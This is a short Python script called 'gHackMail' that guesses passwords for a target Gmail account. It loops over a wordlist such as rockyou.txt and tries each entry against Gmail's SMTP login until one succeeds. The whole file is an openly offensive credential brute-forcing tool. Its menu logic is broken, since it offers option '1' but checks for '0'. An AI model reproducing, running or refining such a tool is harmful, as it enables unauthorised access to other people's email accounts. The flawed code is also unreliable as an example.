import smtplib
import sys
from os import system
import pyfiglet

def artwork():
    word = pyfiglet.figlet_format("gHackMail")
    print(word)
    
artwork()
smtpserver = smtplib.SMTP("smtp.gmail.com", 587)

smtpserver.ehlo()
smtpserver.starttls()

user = input("[@] Enter The Target Gmail Adress $~ ")



pwd = input("[$] Enter '1' to use the inbuilt passwords list \n[$] Enter '2' to use a custom passwords list\n $~~ ")

if pwd=='0':
    passswfile="rockyou.txt"

elif pwd=='2':
    passswfile = input("[#] Enter the file path (Password List) $~ ")

else:
    print("\n")
    print("Invalid Input!")
    sys.exit(1)
try:
    passswfile = open(passswfile, "r")

except Exception as e:
    print(e)
    sys.exit(1)

for password in passswfile:
    try:
        smtpserver.login(user, password)

        print("[:] Password Found~ %s" % password)
        break

    except smtplib.SMTPAuthenticationError:
        print("[!] Unsuccessfull~ %s " % password, "")

